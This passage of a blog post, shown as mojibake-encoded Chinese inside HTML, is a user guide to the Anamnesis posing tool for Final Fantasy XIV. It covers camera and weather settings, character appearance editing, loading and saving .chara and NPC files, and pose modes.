è½½â€œæœ‰æ•ˆâ€å¤©æ°”ï¼Œå³å½“å‰æ‰€åœ¨åœ°åŒºçš„æœ‰æ•ˆå¤©æ°”ã€‚ä¿®æ”¹å¤©æ°”åå¯ä»¥å‘ç°åœ°å›¾æ—è¾¹çš„å¤©æ°”å›¾æ ‡æ”¹å˜ï¼Œç­‰å¾…ä¸€å°ä¼šå„¿åœºæ™¯çš„å¤©æ°”å°±ä¼šå‘ç”Ÿæ”¹å˜ã€‚</p><img src="https://s2.loli.net/2022/03/25/v1IniMZHd6mLauW.jpg" style="zoom:80%;" /><p>è¿›å…¥ GPose æ¨¡å¼èƒ½ä½¿ç”¨ä¸‹æ–¹çš„ç›¸æœºé€‰é¡¹ï¼Œä½†ä¸èƒ½æ”¹å˜æ—¶é—´å’Œå¤©æ°”ã€‚</p><ul><li>ç›¸æœº XYZ è½´</li><li>è§†è§’ XY è½´</li><li>æ—‹è½¬</li><li>ä»°è§†&#x2F;ä¿¯è§†è§’åº¦</li><li>ç¼©æ”¾æ¯”ä¾‹</li><li>è§†é‡å¤§å°</li></ul><img src="https://s2.loli.net/2022/03/25/RMHFSDJnv7sNKTc.jpg" style="zoom:80%;" /><h2 id="Character"><a href="#Character" class="headerlink" title="Character"></a>Character</h2><p>ç”¨äºä¸ºè§’è‰²ï¼Œä¹Ÿç§°ä¸º <strong>æ¼”å‘˜ï¼ˆactorï¼‰</strong> æ“ä½œå„ç§ç»†èŠ‚ï¼ŒåŒ…æ‹¬å¤–è§‚å’Œè£…å¤‡ã€‚å¯ä»¥ä¿å­˜å’ŒåŠ è½½è§’è‰²å¤–è§‚ã€NPC å¤–è§‚æˆ–æ€ªç‰©å¤–è§‚ã€è°ƒæ•´å¤–è²Œæ‰©å±•ã€‚å¤–è²Œæ‰©å±•æ˜¯åœ¨æ¸¸æˆä¸­é€šå¸¸æ— æ³•æ›´æ”¹çš„é¢å¤–éƒ¨åˆ†ï¼ŒåŒ…æ‹¬è‚¤è‰²ã€åå…‰ã€ç³è‰²ã€ç³å­”è½®å»“ç­‰ã€‚ï¼ˆæäººæ•°æ®å¤§æ”¾é€.jpgï¼‰</p><img src="https://s2.loli.net/2022/03/25/YPsErAU2IalVTbo.jpg" style="zoom:80%;" /><p>æ‰“å¼€ Anamnesis æ—¶å¦‚æœå·¦ä¾§æ²¡æœ‰è§’è‰²é€‰é¡¹å¡ï¼Œåˆ™åœ¨æ¸¸æˆä¸­é€‰ä¸­è§’è‰²åç‚¹å‡» <code>+</code> æŒ‰é’®å¢åŠ ï¼Œå³é”®å¯ä»¥è§£é™¤æˆ–é€‰ä¸­ï¼Œå·¦é”®ç›´æ¥ç‚¹å‡»æ‰“å¼€è¯¥é€‰é¡¹å¡å°±æ˜¯é€‰ä¸­ã€‚</p><img src="https://s2.loli.net/2022/03/25/QN2tyTOZGuacJnr.jpg" style="zoom:80%;" /><p><strong>è‡ªå®šä¹‰</strong>ï¼šå³æäººæ•°æ®ï¼Œæ— æ•ˆå€¼å¯èƒ½ä¼šå¯¼è‡´éƒ¨åˆ†æ¨¡å‹æ¶ˆå¤±</p><ul><li>çœ¼ç›ã€è„¸éƒ¨ä» 1 å¼€å§‹ç¼–å·</li><li>ä¸‹é¢Œã€çœ‰æ¯›ã€é¼»å‹ã€å°¾å·´å½¢çŠ¶ä» 0 å¼€å§‹ç¼–å·ï¼Œè€³æœµå½¢çŠ¶ä» 1 å¼€å§‹ç¼–å·</li><li>ç³è‰²çš„é”å®šé»˜è®¤å…³é—­ï¼ˆå¼‚è‰²ï¼‰</li><li>è£…é¥°é™¤äº†ç›®å‰å·²æœ‰çš„ï¼Œè¿˜åŒ…æ‹¬ä¹‹å‰çš„é—äº§çº¹èº«</li></ul><p><strong>è‚¤è‰²</strong>ï¼šå’Œæ¸¸æˆå®é™…çš„ç•Œé¢ä¸€ä¸€å¯¹åº”ï¼Œéå¸¸å‹å¥½ï¼</p><img src="https://s2.loli.net/2022/03/25/6JtEzZLKYai9m8W.jpg" style="zoom:80%;" /><p><strong>å‘å‹</strong>ï¼šç»™å‡ºäº†å½“å‰ç§æ—çš„æ‰€æœ‰å¯ç”¨å‘å‹ï¼ŒåŒ…æ‹¬ä½¿ç”¨å‘å‹æ ·å¼è·å¾—çš„å‘å‹ã€‚</p><img src="https://s2.loli.net/2022/03/25/7PLajMQYZJ8c9BS.jpg" style="zoom:80%;" /><p><strong>æ³¨æ„ï¼š</strong>åˆ‡æ¢ç§æ—åé»˜è®¤ä¿ç•™å±æ€§ï¼Œå¦‚æœå½“å‰å‘å‹æ— æ³•ç”¨åˆ™ä¼šæ˜¾ç¤ºå…‰å¤´ï¼Œé€‰æ‹©å¯ç”¨å‘å‹åå°±èƒ½æ­£å¸¸æ˜¾ç¤ºäº†ã€‚</p><p><img src="https://s2.loli.net/2022/03/25/ZKYG8PJHamWTxEA.jpg" style="zoom:50%;" /><img src="https://s2.loli.net/2022/03/25/sXb9Rv3SFPhH74a.jpg" style="zoom:50%;" /></p><p><strong>è£…å¤‡</strong>ï¼šè£…å¤‡å’ŒæŸ“è‰²ï¼Œå¦‚æœæœ‰æŠ•å½±åˆ™æ˜¾ç¤ºæŠ•å½±è£…å¤‡</p><ul><li>è£…å¤‡ç§æ—ä¸“ç”¨è£…å¤‡</li><li>è£…å¤‡ NPC å†…è¡£</li><li>ç§»é™¤æ‰€æœ‰è£…å¤‡</li></ul><p>è£…å¤‡ NPC å†…è¡£çš„æ•ˆæœå¦‚ä¸‹ï¼ˆå…¨è£¸ï¼‰ï¼š</p><img src="https://s2.loli.net/2022/03/25/QYNMu1ntfE6Haig.jpg" style="zoom:80%;" /><p>ç‚¹å‡»èº«ä½“è£…å¤‡åå³ä¾§å¼¹å‡ºæµ®å‡ºæ§ä»¶ï¼Œæœ‰è®¸å¤šè¿‡æ»¤é€‰é¡¹ï¼Œæ”¯æŒç›´æ¥æœç´¢ã€é€‰æ‹© NPC è£…å¤‡ã€‚</p><img src="https://s2.loli.net/2022/03/25/UTgDpkwcRxo8IMO.jpg" style="zoom:80%;" /><p>Anamnesis åœ¨å¤´éƒ¨å’Œèº«ä½“è£…å¤‡åˆ—è¡¨ä¸­æ·»åŠ äº†â€œéšè—â€é¡¹ç›®ï¼Œè£…å¤‡éšè—èº«ä½“ååªæ˜¾ç¤ºå¤´éƒ¨ï¼Œå†è£…å¤‡éšè—å¤´éƒ¨ååªæ˜¾ç¤ºæ­¦å™¨ã€‚</p><div class="tabs" id="éšè—"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="éšè—-1">éšè—èº«ä½“</button><button type="button" class="tab " data-href="éšè—-2">éšè—èº«ä½“å’Œå¤´éƒ¨</button></ul><div class="tab-contents"><div class="tab-item-content active" id="éšè—-1"><p>åªæ˜¾ç¤ºå¤´éƒ¨å’Œæ­¦å™¨ï¼š</p><img src="https://s2.loli.net/2022/03/25/lMoSypPrA3e9KDR.jpg" style="zoom:50%;" /></div><div class="tab-item-content" id="éšè—-2"><p>åªæ˜¾ç¤ºæ­¦å™¨ï¼š</p><img src="https://s2.loli.net/2022/03/25/4weOu7SasMxRy9E.jpg" style="zoom:50%;" /></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><p><strong>è§’è‰²</strong></p><ul><li>æ˜µç§°ï¼Œå·¦ä¾§é€‰é¡¹å¡å’Œ Anamnesis çª—å£é¡¶éƒ¨æ˜¾ç¤ºçš„åç§°</li><li>ç±»å‹ï¼šç©å®¶é»˜è®¤æ˜¯ Player ç±»å‹ï¼Œè¿˜æœ‰æˆ˜æ–— NPCã€æˆ¿å±‹ç­‰ç±»å‹<ul><li>å¦‚æœé€‰æ‹©å…¶ä»–ç±»å‹å¯èƒ½ç”¨ä¸äº†ä¸€äº›åŠŸèƒ½ï¼Œæ¯”å¦‚ä»¥å¤ªä¹‹å…‰ã€‚</li></ul></li><li>æ¨¡å‹ï¼šå¯ä»¥ç›´æ¥ç”¨æ¥è½¬æ¢è§’è‰²ï¼Œå‰ææ˜¯çŸ¥é“æ¨¡å‹ç¼–å·</li><li>é€æ˜åº¦ï¼šæœ€å° 0.01ï¼Œè‚‰çœ¼çœ‹èµ·æ¥å°±æ˜¯éšå½¢</li><li>å­æ¼”å‘˜ï¼šé™†è¡Œé¸Ÿã€å® ç‰©ã€æ—¶å°šé…é¥°ï¼Œå¬å”¤å‡ºæ¥åè¿™é‡Œå°±ä¼šæ˜¾ç¤ºç›¸åº”çš„å›¾æ ‡</li></ul><p><strong>æ¨¡å‹</strong></p><ul><li>æ•°æ®è·¯å¾„ï¼šåŠ è½½ç©å®¶å¯¹åº”çš„æ¨¡å‹<ul><li>ä¿®æ”¹æ•°æ®è·¯å¾„åå¯ä»¥ä½¿ç”¨ç§æ—&#x2F;æ€§åˆ«ç‰¹å®šè¡¨æƒ…ï¼Œåªèƒ½åœ¨ç©å®¶èº«ä¸Šè¿›è¡Œã€‚</li></ul></li><li>é«˜åº¦ï¼šå’Œèº«é«˜ä¸åŒï¼Œå¯ä»¥æ‹‰å¾—è¶…çº§å¤§</li><li>æ¹¿èº«ï¼šæ¹¿èº«æ•ˆæœ</li><li>èƒ¸éƒ¨ï¼šè°ƒæ•´å¥³å·çš„èƒ¸éƒ¨å¤§å°ï¼Œç”·å·æ— æ•ˆ</li></ul><p><strong>å¤–è²Œæ‰©å±•</strong></p><ul><li>è‚¤è‰²ï¼šè‚¤è‰²ã€å…‰ç…§é¢œè‰²</li><li>å”‡è‰²ï¼šå”‡è‰²</li><li>ç³è‰²ï¼šå·¦çœ¼ã€å³çœ¼ã€é¢å¦†</li><li>è‚Œè‚‰ï¼šæ•°å€¼è¶Šå¤§è¶Šç¡¬æœ—ï¼ˆå‚ç…§äººæ—ï¼‰</li></ul><p>å¤–è²Œæ‰©å±•çš„é¢œè‰²é€‰æ‹©å™¨ï¼š</p><img src="https://s2.loli.net/2022/03/25/KpgI6fm7HokFxuy.jpg" style="zoom:80%;" /><h3 id="åŠ è½½è§’è‰²æ–‡ä»¶"><a href="#åŠ è½½è§’è‰²æ–‡ä»¶" class="headerlink" title="åŠ è½½è§’è‰²æ–‡ä»¶"></a>åŠ è½½è§’è‰²æ–‡ä»¶</h3><p>ä¸å¸¸è§„è§’è‰²ç¼–è¾‘ä¸€æ ·ï¼ŒåŠ è½½è§’è‰²æ–‡ä»¶ï¼ˆ<code>.chara</code>ï¼‰å¿…é¡»åœ¨è¿›å…¥ GPose æ¨¡å¼å‰å®Œæˆï¼Œå¤–è²Œæ‰©å±•é™¤å¤–ã€‚</p><p>é¦–å…ˆç¡®ä¿å·¦ä¾§åˆ—è¡¨ä¸­é€‰æ‹©äº†ç›¸åº”çš„è§’è‰²ï¼Œç„¶åç‚¹å‡»å³ä¸‹è§’çš„è½½å…¥æŒ‰é’®å¼¹å‡ºæµ®å‡ºæ§ä»¶ã€‚</p><p>å·¦ä¾§æ˜¯æ–‡ä»¶æºï¼ŒåŒ…å«ç‰¹å®šç±»å‹æ–‡ä»¶çš„é¢„å®šæ–‡ä»¶å¤¹ï¼Œå³ä¾§æ˜¯æ–‡ä»¶é¢„è§ˆã€‚</p><ul><li>Anamnesis æ–‡ä»¶å¤¹ï¼šåŒ…å« <code>.chara</code> æ–‡ä»¶</li><li>Final Fantasy XIV æ–‡ä»¶å¤¹ï¼šåŒ…å« <code>.dat</code> æ–‡ä»¶</li><li>Concept Matrix Saves æ–‡ä»¶å¤¹ï¼šåŒ…å« <code>.cma</code> æˆ– <code>.json</code> æ–‡ä»¶ï¼Œè‡ªåŠ¨è¯»å–äº† CMTool çš„æ–‡ä»¶å¤¹</li><li>Desktopï¼šæ¡Œé¢</li></ul><p>å°†é¼ æ ‡æ‚¬åœåœ¨æ–‡ä»¶å¤¹å›¾æ ‡ä¸Šå¯ä»¥æŸ¥çœ‹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥ä¿å­˜åˆ°é¢„å®šæ–‡ä»¶å¤¹ä¹‹å¤–çš„æ–‡ä»¶å¤¹ï¼Œç‚¹å‡»å·¦ä¾§æœ€ä¸‹æ–¹çš„ <code>...</code> é€‰æ‹©ã€‚</p><img src="https://s2.loli.net/2022/03/25/Q7WILtaPHS2Oj3x.jpg" style="zoom:80%;" /><p>æœ€åç‚¹å‡»å³ä¸‹çš„åŠ è½½æŒ‰é’®åŠ è½½å¤–è§‚ï¼Œä¾‹å¦‚ï¼ŒåŠ è½½ä¹‹å‰åœ¨ CMTool ä¸­ä¿å­˜çš„é¾™ç”·å¤–è²Œï¼ˆæè„¸æ•°æ®å¤§æ”¾é€x2ï¼‰ï¼š</p><img src="https://s2.loli.net/2022/03/25/nbWcslJxPU6GuKo.jpg" style="zoom:80%;" /><p><strong>æ³¨æ„ï¼š</strong>åˆ‡æ¢å‰¯æœ¬åŒºå°±å˜å›åŸæ¥çš„æ¨¡æ ·ã€‚</p><h3 id="é«˜çº§åŠ è½½é€‰é¡¹"><a href="#é«˜çº§åŠ è½½é€‰é¡¹" class="headerlink" title="é«˜çº§åŠ è½½é€‰é¡¹"></a>é«˜çº§åŠ è½½é€‰é¡¹</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œè§’è‰²çš„æ‰€æœ‰å±æ€§éƒ½è¢«é€‰ä¸­ï¼Œä½†ä¹Ÿå¯ä»¥æŒ‡å®šä» <code>.chara</code> æ–‡ä»¶ä¸­åŠ è½½çš„å±æ€§ã€‚ç‚¹å‡»è½½å…¥æŒ‰é’®æ—è¾¹çš„ <code>Ë…</code>ï¼Œé€‰æ‹©è¦åŠ è½½çš„å±æ€§ï¼š</p><ul><li>å¤–è²Œï¼šè‡ªå®šä¹‰ã€æ¨¡å‹å’Œæ‰©å±•å¤–è§‚é¢æ¿ä¸­çš„æ‰€æœ‰å†…å®¹</li><li>è£…å¤‡ï¼šè£…å¤‡é¢æ¿ä¸­çš„æ‰€æœ‰å†…å®¹</li><li>é˜²å…·ï¼šå¤´éƒ¨ã€èº«ä½“ã€æ‰‹éƒ¨ã€è…¿éƒ¨ã€è„šéƒ¨</li><li>é¥°å“ï¼šè€³æœµã€è„–å­ã€æ‰‹è…•ã€å³ç¯ã€å·¦ç¯</li><li>æ­¦å™¨ï¼šä¸»æ‰‹ã€å‰¯æ‰‹</li></ul><img src="https://s2.loli.net/2022/03/25/eXRhvF9VaZHnpgN.jpg" style="zoom:80%;" /><p>ç„¶è€Œï¼Œå¦‚æœæ–‡ä»¶ä¸åŒ…å«è£…å¤‡æ•°æ®ï¼Œä¾‹å¦‚ FFXIV çš„ <code>.dat</code> æˆ– Concept Matrix çš„ <code>.cma</code> æ–‡ä»¶ï¼Œåˆ™åªä¼šåŠ è½½å¯åŠ è½½çš„æ•°æ®ï¼Œå¤§å¤šæ•°æƒ…å†µä¸‹æ˜¯å¤–è§‚æ•°æ®ã€‚</p><h3 id="åŠ è½½-NPC-å¤–è§‚"><a href="#åŠ è½½-NPC-å¤–è§‚" class="headerlink" title="åŠ è½½ NPC å¤–è§‚"></a>åŠ è½½ NPC å¤–è§‚</h3><p>æœ‰è®¸å¤š NPC ä½¿ç”¨çš„æ¸¸æˆèµ„äº§ç”¨æˆ·æ— æ³•åœ¨æ¸¸æˆä¸­æœ¬åœ°è®¿é—®ï¼Œä½†å¯ä»¥ç”¨ Anamnesis è£…å¤‡ã€‚æ ¹æ®ç»éªŒï¼Œå¦‚æœ NPC çš„å¤–è§‚å¯ä»¥é€šè¿‡é€‰æ‹©ç‰¹å®šå±æ€§ï¼Œä¾‹å¦‚å¤´éƒ¨ç½‘æ ¼ã€é¢éƒ¨å’Œæœè£…æ¥æ‰‹åŠ¨åº”ç”¨ï¼Œé‚£ä¹ˆä»–ä»¬å¯ä»¥è¢«è§†ä¸ºç©å®¶è§’è‰²ï¼Œå¤–è§‚åŠ è½½ä¸ <code>.chara</code> æ–‡ä»¶åŠ è½½å¤§è‡´ç›¸åŒã€‚ä¸€ä¸ªæ›´åŸºæœ¬çš„çœ‹æ³•æ˜¯ï¼Œå¦‚æœ NPC ä½¿ç”¨æ ‡å‡†çš„ä¸­åŸä¹‹æ°‘éª¨æ¶ï¼ˆ<code>middy.json</code>ï¼‰ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥åƒç©å®¶ä¸€æ ·è¢«åŠ è½½ã€‚</p><p>æœ‰äº› NPC ä½¿ç”¨è‡ªå·±çš„éª¨æ¶å’Œç©å®¶æ— æ³•è£…å¤‡çš„ç‰©å“ï¼Œå› æ­¤è¢«å½’ç±»ä¸ºæ€ªç‰©ã€‚è¿™äº› NPC åŒ…æ‹¬ä½†ä¸é™äºï¼šèŠè¯ºæ–¯ã€ç›–å¨…ã€ç“¦å‰æ–¯ã€æ²ƒæ–¯é‡Œç­‰ã€‚</p><p>åŠ è½½ NPC å¤–è§‚åªéœ€ç‚¹å‡»å³ä¸‹è§’çš„ NPC æŒ‰é’®ï¼Œåœ¨å¼¹å‡ºçš„æµ®å‡ºæ§ä»¶ä¸­è¿‡æ»¤æœç´¢ï¼Œé€‰æ‹© NPC è¿›è¡ŒåŠ è½½ã€‚ä¾‹å¦‚ï¼Œç›´æ¥æœç´¢ <code>ä¿®ç‰¹æ‹‰</code> è¿”å›å¤šä¸ªç»“æœï¼Œåˆ†åˆ«æ˜¯ä¸åŒæ—¶æœŸçš„å½¢è±¡ï¼Œè¿˜åŒ…æ‹¬å® ç‰©ã€‚</p><img src="https://s2.loli.net/2022/03/25/vQNTPsC3XOca7ZL.jpg" style="zoom:80%;" /><p>ä¹Ÿå¯ä»¥åŠ è½½ NPC å¤–è§‚çš„æŒ‡å®šå±æ€§ï¼Œç‚¹å‡» NPC æŒ‰é’®æ—è¾¹çš„ <code>Ë…</code> æŒ‰é’®ï¼Œé€‰æ‹©è¦åŠ è½½å±æ€§ï¼š</p><ul><li>å¤–è²Œï¼šè‡ªå®šä¹‰é¢æ¿ä¸­çš„ä»»ä½•å†…å®¹</li><li>è£…å¤‡ï¼šè£…å¤‡é¢æ¿ä¸­é™¤ä¸»æ‰‹å’Œå‰¯æ‰‹å¤–çš„ä»»ä½•ä¸œè¥¿</li><li>æ­¦å™¨ï¼šä¸»æ‰‹ã€å‰¯æ‰‹</li></ul><img src="https://s2.loli.net/2022/03/25/VpqnG8BzstSol2C.jpg" style="zoom:80%;" /><h3 id="åŠ è½½å¤–è²Œæ‰©å±•"><a href="#åŠ è½½å¤–è²Œæ‰©å±•" class="headerlink" title="åŠ è½½å¤–è²Œæ‰©å±•"></a>åŠ è½½å¤–è²Œæ‰©å±•</h3><p>å¤–è²Œæ‰©å±•æ˜¯ <code>.chara</code> æ–‡ä»¶ä¸­å”¯ä¸€å¯ä»¥åœ¨ GPose æ¨¡å¼ä¸­åŠ è½½çš„å±æ€§ã€‚è¿›å…¥ GPose æ¨¡å¼åå†åŠ è½½é€‰å®šçš„ <code>.chara</code> æ–‡ä»¶å³å¯ã€‚</p><h3 id="ä¿å­˜å¤–è§‚"><a href="#ä¿å­˜å¤–è§‚" class="headerlink" title="ä¿å­˜å¤–è§‚"></a>ä¿å­˜å¤–è§‚</h3><p>åœ¨ Anamnesis ä¸­è§’è‰²æ–‡ä»¶å°†ä¿å­˜ä¸º <code>.chara</code> æ–‡ä»¶æ ¼å¼ï¼Œé»˜è®¤åŒ…å«æ‰€æœ‰å¤–è§‚å’Œè£…å¤‡æ•°æ®ï¼ˆåŒ…æ‹¬ç§æ—ã€åˆ†æ”¯ï¼‰ï¼Œç‚¹å‡»å³ä¸‹è§’çš„ä¿å­˜æŒ‰é’®å¼¹å‡ºæµ®å‡ºæ§ä»¶ã€‚</p><p>é»˜è®¤æä¾›ä¸¤ä¸ªæ–‡ä»¶å¤¹ä½œä¸ºæºï¼Œç‚¹å‡» <code>...</code> é€‰æ‹©å…¶ä»–æ–‡ä»¶å¤¹ä¿å­˜ã€‚</p><ul><li>Anamnesis æ–‡ä»¶å¤¹</li><li>Desktopï¼šæ¡Œé¢</li></ul><img src="https://s2.loli.net/2022/03/25/xcsqjoUDuvWLbFO.jpg" style="zoom:80%;" /><p><strong>æ³¨æ„ï¼š</strong>Anamnesis ä¸èƒ½ä¿å­˜ <code>.cma</code>ã€ <code>.json</code>ã€<code>.dat</code> æ ¼å¼çš„æ–‡ä»¶ï¼Œåè¿‡æ¥ CMTool ä¹Ÿä¸èƒ½åŠ è½½ <code>.chara</code> æ–‡ä»¶ã€‚</p><h3 id="åŠ è½½æ¨¡å‹"><a href="#åŠ è½½æ¨¡å‹" class="headerlink" title="åŠ è½½æ¨¡å‹"></a>åŠ è½½æ¨¡å‹</h3><p>å¯ä»¥å°†å„ç§æ¨¡å‹åŠ è½½åˆ°é€‰å®šçš„æ¼”å‘˜ä¸Šï¼ŒåŒ…æ‹¬ NPCã€æ€ªç‰©ã€å® ç‰©å’Œé“å…·ç­‰ã€‚ä»¥ä¸‹æ˜¯æ¯ä¸ªç±»å‹çš„ç®€è¦è¯´æ˜ï¼š</p><ul><li><strong>NPC</strong>ï¼šæ¸¸æˆä¸­å¤§éƒ¨åˆ†çš„å‘½åè§’è‰²ï¼Œä¾‹å¦‚é›…Â·ä¿®ç‰¹æ‹‰<ul><li>æœ€å¥½åŠ è½½åˆ°è‡ªå·±çš„è§’è‰²æˆ–å®çŸ³å…½ä¸Šï¼Œä»¥å…è¿›å…¥ GPose æ¨¡å¼æ—¶ä¸¢å¤±ç‹¬ç‰¹å±æ€§ï¼Œä¾‹å¦‚ï¼Œä¸å±äºå¤´éƒ¨ç½‘æ ¼çš„ç‰¹æ®Šçº¹èº«ã€è‡ªå®šä¹‰çœ¼ç›å‘å…‰é¢œè‰²ç­‰ã€‚</li><li>å¦‚æœ NPC ä½¿ç”¨äº†ç©å®¶å¯è£…å¤‡çš„ç‰©å“ï¼Œé‚£å®ƒä»¬çš„å¤„ç†æ–¹å¼ä¸ <code>.chara</code> æ–‡ä»¶å¤§è‡´ç›¸åŒã€‚</li></ul></li><li><strong>è§’è‰²ï¼ˆCharacterï¼‰</strong>ï¼šä½œä¸º NPC å‡ºç°ï¼Œä½†å®é™…ä¸Šåœ¨æ¸¸æˆä¸­è¢«è§†ä¸ºæ€ªç‰©çš„è§’è‰²ï¼Œä¾‹å¦‚ç›–å¨…</li><li><strong>åéª‘ï¼ˆMountï¼‰</strong>ï¼šé€šè¿‡å„ç§æ–¹å¼è·å¾—çš„åéª‘</li><li><strong>å® ç‰©ï¼ˆMinionï¼‰</strong>ï¼šé€šè¿‡å„ç§æ–¹å¼è·å¾—çš„å® ç‰©</li><li><strong>æ•ˆæœï¼ˆEffectï¼‰</strong>ï¼šåœ¨æ¸¸æˆä¸­ä½œä¸ºç‹¬ç«‹å®ä½“å‡ºç°çš„æ•Œäººæ•ˆæœï¼Œé€šå¸¸å‡ºç°åœ¨ Boss æˆ˜ä¸­</li><li><strong>æ€ªç‰©ï¼ˆMonsterï¼‰</strong>ï¼šä¸»ä¸–ç•Œçš„æ€ªç‰©ã€å‰¯æœ¬ä¸­çš„æ€ªç‰©ã€è›®æ—<ul><li>å³åŸºæœ¬ä¸Šä¸ä½¿ç”¨äººå½¢éª¨éª¼çš„ä»»ä½•æ¨¡å‹ã€‚</li></ul></li><li><strong>ä¿®æ”¹ï¼ˆModdedï¼‰</strong>ï¼šAnamnesis å°†é€šè¿‡è¯»å– TexTools ä¿®æ”¹åˆ—è¡¨è¿‡æ»¤å·²è¢«ä¿®æ”¹çš„å®ä½“</li><li><strong>æœªçŸ¥ï¼ˆUnknownï¼‰</strong>ï¼šå°šæœªæ­£ç¡®åˆ†ç±»çš„å®ä½“<ul><li>å‚é˜… <a href="https://github.com/imchillin/Anamnesis/wiki/Loading-Models">Contributing to the Model List</a> è·å–æ›´å¤šä¿¡æ¯ã€‚</li></ul></li></ul><p>å·¦ä¾§é€‰æ‹©è¦è½¬æ¢çš„è§’è‰²åï¼Œç‚¹å‡»å³ä¸‹è§’çš„è½½å…¥æˆ– NPC æŒ‰é’®è°ƒå‡ºæµ®å‡ºæ§ä»¶ï¼Œå¯ä»¥åœ¨æœç´¢æ æŒ‰åç§°æœç´¢ï¼Œç„¶åé€‰æ‹©æƒ³è¦åŠ è½½çš„æ¨¡å‹ã€‚ï¼ˆåŒåŠ è½½ NPC å¤–è§‚çš„å†…å®¹ï¼‰</p><img src="https://s2.loli.net/2022/03/25/vQNTPsC3XOca7ZL.jpg" style="zoom:80%;" /><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>GPose æ¨¡å¼ä¸­æ— æ³•åŠ è½½æ¨¡å‹ã€‚</li><li>æŸäº›æ¨¡å‹éœ€è¦æ›´æ”¹ç±»å‹æ‰èƒ½æ­£ç¡®æ˜¾ç¤ºï¼Œé€šå¸¸ä¼šè‡ªåŠ¨æ›´æ”¹ï¼Œä½†æœ‰äº›æ¨¡å‹ä»éœ€è¦æ‰‹åŠ¨æ›´æ”¹ç±»å‹ï¼Œå¹¶å¯èƒ½éœ€è¦æ‰‹åŠ¨æ›´æ”¹æŸäº›è£…å¤‡ã€‚</li></ul><p>Anamnesis ä½¿ç”¨çš„æ¨¡å‹åˆ—è¡¨æ˜¯äººå·¥ç»´æŠ¤çš„ï¼Œå¯ä»¥æŸ¥çœ‹å…±äº«çš„ <a href="https://docs.google.com/spreadsheets/d/1Z46RPHl0eLsK0gpWhuymefEbe6D15mtx4wbgf0NXSIo/edit#gid=666947796">Google è¡¨æ ¼</a>ã€‚</p><h2 id="Pose"><a href="#Pose" class="headerlink" title="Pose"></a>Pose</h2><p>æ“çºµè§’è‰²ï¼ˆæ¼”å‘˜ï¼‰çš„åœ°æ–¹ï¼Œå¯ä»¥ä»ä¸‰ç§åŠ¨ä½œæ¨¡å¼ä¸­è¿›è¡Œé€‰æ‹©ï¼šGUIã€åŠ¨ä½œçŸ©é˜µã€Pose 3Dï¼Œç‚¹å‡»å³ä¸‹è§’çš„è½½å…¥å¯ä»¥åŠ è½½ <code>.pose</code> æ–‡ä»¶ã€‚</p><div class="tabs" id="åŠ¨ä½œæ¨¡å¼"><ul class="nav-tabs"><button type="button" class="tab  active" data-href="åŠ¨ä½œæ¨¡å¼-1">GUI</button><button type="button" class="tab " data-href="åŠ¨ä½œæ¨¡å¼-2">åŠ¨ä½œçŸ©é˜µ</button><button type="button" class="tab " data-href="åŠ¨ä½œæ¨¡å¼-3">Pose 3D</button></ul><div class="tab-contents"><div class="tab-item-content active" id="åŠ¨ä½œæ¨¡å¼-1"><img src="https://s2.loli.net/2022/03/25/wbCUsQDomtXdT72.jpg" style="zoom:80%;" /></div><div class="tab-item-content" id="åŠ¨ä½œæ¨¡å¼-2"><img src="https://s2.loli.net/2022/03/25/vau3esti4XgjcBV.jpg" style="zoom:80%;" /></div><div class="tab-item-content" id="åŠ¨ä½œæ¨¡å¼-3"><img src="https://s2.loli.net/2022/03/25/ZmUk8QasOow5f7H.jpg" style="zoom:80%;" /></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><p>Anamnesis å…¼å®¹ Concept Matrix åŠ¨ä½œæ–‡ä»¶ï¼ˆ<code>.cmp</code>ï¼‰ï¼Œä½† CMTool ç”¨ä¸äº† <code>.pose</code> åŠ¨ä½œæ–‡ä»¶ã€‚ï¼ˆå°šæœªå°è¯• <code>.cmp</code> æ–‡ä»¶ï¼‰</p><p>ä¿å­˜åŠ¨ä½œæ–‡ä»¶æ—¶è¦ç¡®ä¿åœ¨ç”¨æˆ·åŠ¨ä½œæ–‡ä»¶å¤¹ä¸­ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥æ–‡ä»¶å¤¹ä½äº <code>æ–‡æ¡£/Anamnesis</code> ç›®å½•ä¸­ã€‚é€šè¿‡æ›´æ”¹è®¾ç½®æµ®å‡ºæ§ä»¶ä¸­çš„è·¯å¾„ï¼ˆç‚¹å‡» <code>...</code>ï¼‰ï¼Œå¯ä»¥å°†å…¶æ›´æ”¹ä¸ºä»»ä½•æ–‡ä»¶å¤¹ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>ä¸è¦å°†åŠ¨ä½œæ–‡ä»¶æ”¾å…¥ Anamnesis ç¨‹åºæˆ– AppData ä¸‹çš„æ–‡ä»¶å¤¹ï¼Œå°¤å…¶æ˜¯ Built-In Poses æ–‡ä»¶å¤¹ï¼Œå› ä¸ºè¿™äº›æ–‡ä»¶å¤¹ä¼šåœ¨å·¥å…·æ›´æ–°æ—¶è¢«æ›¿æ¢ï¼Œå› æ­¤ç”¨æˆ·æ”¾å…¥çš„ä»»ä½•å†…å®¹éƒ½ä¼šè¢«åˆ é™¤ã€‚</p><img src="https://s2.loli.net/2022/03/25/BGYV6OL7HDl1bNE.jpg" style="zoom:80%;" /><h3 id="åŠ è½½åŠ¨ä½œæ–‡ä»¶"><a href="#åŠ è½½åŠ¨ä½œæ–‡ä»¶" class="headerlink" title="åŠ è½½åŠ¨ä½œæ–‡ä»¶"></a>åŠ è½½åŠ¨ä½œæ–‡ä»¶</h3><p>è¿›å…¥ GPose æ¨¡å¼åï¼Œé¦–å…ˆæš‚åœäººç‰©ï¼ˆå…¨ä½“åŠ¨ä½œæš‚åœæˆ–ç›®æ ‡åŠ¨ä½œæš‚åœï¼‰ï¼Œç„¶åæ‰‹åŠ¨å¼€å¯ Posing modeï¼ˆå·¦ä¸Šè§’æŒ‰é’®ï¼‰ï¼Œäººç‰©ä¼šè¢«å†»ç»“ï¼Œå¦‚æœæ²¡æœ‰æš‚åœäººç‰©ï¼Œé‚£ä¹ˆäººç‰©ä¼šåœ¨åŸåœ°æŠ–åŠ¨ï¼Œæš‚åœåŠ¨ä½œåå¯ä»¥å¼€å§‹åŠ 